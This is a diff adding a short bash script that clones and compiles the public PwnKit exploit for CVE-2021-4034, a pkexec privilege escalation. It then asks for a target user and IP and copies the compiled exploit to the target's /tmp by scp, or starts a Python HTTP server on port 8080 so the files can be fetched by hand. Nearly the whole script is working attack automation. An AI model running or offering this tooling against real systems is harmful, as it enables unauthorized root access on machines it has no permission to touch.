@@ -1,0 +1,53 @@
+#!/bin/bash 
+# Author: T3sla
+# NOOB CODE
+# Thx: https://deepl.com https://github.com/berdav/CVE-2012-4034 https://github.com/s4vitar/htbexplorer (Colours)
+
+# Colours (Thx s4vitar)
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+function clon_repo()
+{
+	echo -e "${purpleColour}Cloning repo (https://github.com/berdav/CVE-2021-4034)${endColour}"
+	sleep 0.5
+	git clone https://github.com/berdav/CVE-2021-4034.git ; cd CVE-2021-4034 ; cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c ; cc -Wall cve-2021-4034.c -o cve-2021-4034 ; cp pwnkit.so cve-2021-4034 ../ ; cd .. ; rm -rfv CVE-2021-4034 
+	sleep 0.5
+	clear
+	echo -e "${greenColour}OK!${endColour}"
+}
+clon_repo
+
+function info_machine()
+{
+	export files=("pwnkit.so cve-2021-4034 pkexec-pwn")
+	echo -e "${yellowColour}input the user machine:${endColour}"
+	read user_machine
+	echo -e "${greenColour}Saved!$endColour"
+	echo -e "${yellowColour}input the machine ip:${endColour}"
+	read ip_machine
+	echo -e "${greenColour}Saved!${endColour}"
+	
+	echo -e '\n'
+
+	echo -e "${yellowColour}File transfer with SCP, do you have the credentials : [yes/no]${endColour}"
+	read answer
+	if [ $answer == yes ]
+	then 
+		echo -e "${purpleColour}Starting (;${endColour}"
+		scp $files $user_machine@$ip_machine:/tmp/
+		sleep 2
+		echo -e "${greenColour}Completed (;${endColour}"
+	else
+		echo -e "${redColour}You will have to transfer the files manually! (Starting http server on port 8080)${endColour}"
+		xterm -e python3 -m http.server 8080
+	fi
+	
+}
+info_machine
